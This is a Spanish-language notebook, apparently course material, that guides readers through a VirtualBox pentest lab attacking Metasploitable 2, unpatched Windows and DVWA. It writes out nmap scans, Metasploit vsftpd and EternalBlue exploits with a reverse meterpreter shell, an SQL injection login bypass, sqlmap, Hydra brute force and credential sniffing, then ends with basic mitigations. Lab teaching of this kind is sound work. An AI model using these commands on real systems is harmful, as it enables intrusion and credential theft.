# %% [markdown]
# <a href="https://colab.research.google.com/github/William-Burbano-Lima/Ciberseguridad-integrador/blob/main/0_LABORATORIO.ipynb" target="_parent"><img src="https://colab.research.google.com/assets/colab-badge.svg" alt="Open In Colab"/></a>

# %% [markdown]
# Para practicar ciberseguridad con **Kali Linux** y un **equipo víctima** en **VirtualBox**, puedes simular un entorno de prueba controlado. Aquí tienes una guía paso a paso:
#
# ---
#
# ### 🔹 **Requisitos Previos**
# 1. **Instalar VirtualBox** y las **extensiones de VirtualBox** (para compatibilidad con redes).
# 2. **Descargar e instalar Kali Linux** en VirtualBox.
# 3. **Descargar una máquina víctima**, como **Metasploitable 2** o **Windows 7/10 vulnerable** (Ej: con EternalBlue o aplicaciones inseguras como XAMPP, DVWA).
# 4. **Configurar la red** para permitir la comunicación entre Kali y la víctima.
#
# ---
#
# ### 🔹 **Configuración de Red en VirtualBox**
# Para que Kali y la víctima se comuniquen:
# 1. En **VirtualBox**, abre la configuración de cada máquina.
# 2. Ve a la pestaña **Red** y elige:
#    - **Modo Adaptador Interno** (ambas máquinas en la misma red).
#    - O **Red NAT + Adaptador de Host** (para internet y conexión local).
#
# ---
#
# ### 🔹 **Escaneo y Reconocimiento con Kali**
# Antes de lanzar ataques, identifica el equipo víctima en la red.
#
# 1️⃣ **Descubre las máquinas activas:**
# ```bash
# netdiscover -r 192.168.1.0/24
# ```
#
# 2️⃣ **Escaneo de puertos abiertos y servicios:**
# ```bash
# nmap -A -p- 192.168.1.100  # (IP de la víctima)
# ```
#
# 3️⃣ **Identificar vulnerabilidades:**
# ```bash
# nmap --script vuln 192.168.1.100
# ```
#
# ---
#
# ### 🔹 **Ejemplo de Explotación con Metasploit**
# Si la víctima es **Metasploitable 2**, puedes probar con un ataque a **vsftpd**:
#
# 1️⃣ Iniciar Metasploit:
# ```bash
# msfconsole
# ```
#
# 2️⃣ Buscar y usar el exploit:
# ```bash
# search vsftpd
# use exploit/unix/ftp/vsftpd_234_backdoor
# ```
#
# 3️⃣ Configurar parámetros:
# ```bash
# set RHOSTS 192.168.1.100
# set RPORT 21
# exploit
# ```
#
# 4️⃣ Si el ataque es exitoso, obtendrás una **shell** remota.
#
# ---
#
# ### 🔹 **Protección y Auditoría**
# Después de la práctica, también puedes analizar cómo proteger una máquina:
# - **Configurar un firewall** (`ufw` en Linux, `Windows Defender` en Windows).
# - **Cerrar puertos innecesarios**.
# - **Actualizar software** para evitar exploits conocidos.
#
# ---
# ### 🔥 **Configurar Otro Entorno de Prueba en VirtualBox con Kali Linux** 🔥
# Si quieres probar más vulnerabilidades y ataques en un entorno seguro, aquí tienes una **nueva configuración** con diferentes máquinas vulnerables.
#
# ---
#
# ## **🔹 Opciones de Máquinas Víctima**
# Para simular diferentes ataques, puedes usar una de estas opciones:
#
# ### **1️⃣ Metasploitable 2 (Linux vulnerable)**
#    - Descargar: [Metasploitable 2](https://sourceforge.net/projects/metasploitable/files/Metasploitable2/)
#    - Características:
#      - SSH, FTP, MySQL, PostgreSQL vulnerables.
#      - Web con DVWA (Damn Vulnerable Web App).
#      - Permite pruebas con **Metasploit**, **SQL Injection**, **XSS**, etc.
#
# ### **2️⃣ Windows 7/10 con vulnerabilidades**
#    - Requiere una ISO de Windows y configurarlo con:
#      - **EternalBlue** (`MS17-010`).
#      - Programas vulnerables como **XAMPP**, **DVWA** o **OpenSSH sin actualizar**.
#    - Puedes activar `SMB` y desactivar actualizaciones para hacer pruebas de exploits.
#
# ### **3️⃣ OWASP Broken Web Apps**
#    - Descargar: [OWASP BWA](https://sourceforge.net/projects/owaspbwa/files/)
#    - Características:
#      - Entorno con aplicaciones vulnerables para pruebas web.
#      - Ideal para practicar ataques en PHP, SQLi, LFI, XSS.
#
# ---
#
# ## **🔹 Instalación y Configuración en VirtualBox**
# 1️⃣ **Descargar e importar la máquina virtual**
#    - Para **Metasploitable 2** y **OWASP BWA**:
#      - Descarga el archivo **.ova** o **.vmdk**.
#      - En **VirtualBox**, ve a **Archivo > Importar servicio virtualizado** y selecciona el archivo.
#
#    - Para **Windows**:
#      - Crea una nueva máquina virtual e instala Windows con una ISO.
#      - Instala software vulnerable manualmente.
#
# 2️⃣ **Configurar Red**
# Para que Kali y la víctima se comuniquen:
#    - Abre la configuración de cada máquina en VirtualBox.
#    - En la pestaña **Red**, elige:
#      - **"Adaptador Interno"** (para comunicación sin internet).
#      - **"NAT + Adaptador de Host"** (para acceso a internet y conexión local).
#
#    - En **Kali Linux**, ejecuta:
#      ```bash
#      ifconfig  # Verifica tu IP en la red interna
#      ```
#
# 3️⃣ **Comprobar Conectividad**
#    Desde Kali, prueba si la víctima responde:
#    ```bash
#    ping 192.168.1.100  # (Reemplaza con la IP de la máquina víctima)
#    ```
#
# ---
#
# ## **🔹 Primera Prueba de Ataque con Metasploit**
# Si tienes **Metasploitable 2** configurado, prueba un escaneo:
# ```bash
# nmap -A -p- 192.168.1.100
# ```
# Luego, intenta explotar una vulnerabilidad, como **vsftpd**:
# ```bash
# msfconsole
# use exploit/unix/ftp/vsftpd_234_backdoor
# set RHOSTS 192.168.1.100
# exploit
# ```
#
# ---
#
# ## **🔹 Siguientes Pasos**
# ✅ ¿Quieres probar ataques específicos como **SQL Injection, XSS o ataques a redes**?
# ✅ ¿Necesitas configurar herramientas adicionales en Kali como **Burp Suite o Wireshark**?
# ### 🔥 **Pasos Siguientes para Pruebas de Seguridad con Kali Linux en VirtualBox** 🔥
#
# Ahora que tienes un **entorno de prueba configurado**, vamos a desarrollar los siguientes pasos:
# ✅ Escaneo avanzado de la red y reconocimiento de vulnerabilidades.
# ✅ Ejecución de ataques específicos (SQL Injection, XSS, SMB Exploits).
# ✅ Uso de herramientas avanzadas en Kali Linux (**Burp Suite, Wireshark, Hydra**).
# ✅ Protección y mitigación de ataques.
#
# ---
#
# ## **🔹 PASO 1: Escaneo Avanzado con Nmap y Enum4linux**
# Antes de lanzar ataques, primero hay que **reconocer la víctima**.
#
# 1️⃣ **Identificar IPs activas en la red interna**
#    ```bash
#    netdiscover -r 192.168.1.0/24
#    ```
#
# 2️⃣ **Escanear servicios y vulnerabilidades con Nmap**
#    ```bash
#    nmap -A -p- 192.168.1.100
#    ```
#    Si sospechas que hay **SMB o Windows**, usa:
#    ```bash
#    nmap --script smb-vuln* -p 445 192.168.1.100
#    ```
#
# 3️⃣ **Obtener información de SMB con Enum4Linux**
#    ```bash
#    enum4linux -a 192.168.1.100
#    ```
#
# ---
#
# ## **🔹 PASO 2: Ataque con Metasploit (SMB Exploits - EternalBlue)**
# Si el escaneo detecta **SMB vulnerable (Windows 7 sin parchear)**, podemos probar **EternalBlue** (`MS17-010`):
#
# 1️⃣ **Abrir Metasploit**
#    ```bash
#    msfconsole
#    ```
#
# 2️⃣ **Cargar el exploit de EternalBlue**
#    ```bash
#    use exploit/windows/smb/ms17_010_eternalblue
#    ```
#
# 3️⃣ **Configurar parámetros**
#    ```bash
#    set RHOSTS 192.168.1.100
#    set LHOST 192.168.1.150  # (IP de tu Kali Linux)
#    set PAYLOAD windows/x64/meterpreter/reverse_tcp
#    exploit
#    ```
#
# 4️⃣ **Si el ataque es exitoso, obtendrás una shell remota**
#    ```bash
#    meterpreter> sysinfo
#    meterpreter> shell
#    ```
#
# ---
#
# ## **🔹 PASO 3: Ataque Web - SQL Injection en DVWA**
# Si tienes una máquina con **DVWA (Damn Vulnerable Web App)**, puedes probar **SQL Injection**.
#
# 1️⃣ **Accede a DVWA**
#    - Abre el navegador en Kali y entra a `http://192.168.1.100/dvwa/`
#    - Usuario: `admin`
#    - Contraseña: `password`
#
# 2️⃣ **Activar modo "low security"**
#    - En `Security` → **Selecciona "Low"**
#
# 3️⃣ **Probar SQL Injection en el login**
#    - En el campo **usuario**, ingresa:
#      ```sql
#      ' OR 1=1 --
#      ```
#    - Si es vulnerable, entrarás sin credenciales.
#
# 4️⃣ **Automatizar SQL Injection con SQLmap**
#    ```bash
#    sqlmap -u "http://192.168.1.100/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --dbs
#    ```
#
# ---
#
# ## **🔹 PASO 4: Ataque de Fuerza Bruta con Hydra**
# Si el escaneo detectó **SSH, FTP o HTTP**, puedes probar ataques de fuerza bruta con `Hydra`.
#
# 1️⃣ **Brute force contra SSH**
#    ```bash
#    hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100
#    ```
#
# 2️⃣ **Brute force contra un login web (DVWA)**
#    ```bash
#    hydra -L users.txt -P passwords.txt 192.168.1.100 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed"
#    ```
#
# ---
#
# ## **🔹 PASO 5: Captura de Tráfico con Wireshark**
# Si quieres **espiar credenciales en la red**, puedes capturar paquetes.
#
# 1️⃣ **Abrir Wireshark en Kali**
#    ```bash
#    wireshark
#    ```
#
# 2️⃣ **Seleccionar la interfaz de red** (Ejemplo: `eth0` o `wlan0`)
# 3️⃣ **Filtrar solo tráfico HTTP (no cifrado)**
#    ```plaintext
#    http.request
#    ```
#
# 4️⃣ **Ver credenciales en paquetes "POST"**
#    - Filtra por `username` o `password`.
#
# ---
#
# ## **🔹 PASO 6: Protección y Mitigación**
# Después de probar los ataques, revisa cómo **evitarlos**.
#
# ✅ **Configurar Firewall en la máquina víctima**
#    - En Linux: `sudo ufw enable`
#    - En Windows: Activar `Windows Defender Firewall`
#
# ✅ **Cerrar servicios no necesarios**
#    ```bash
#    sudo systemctl stop ssh
#    ```
#
# ✅ **Actualizar software y aplicar parches**
#    ```bash
#    sudo apt update && sudo apt upgrade
#    ```
#
# ---
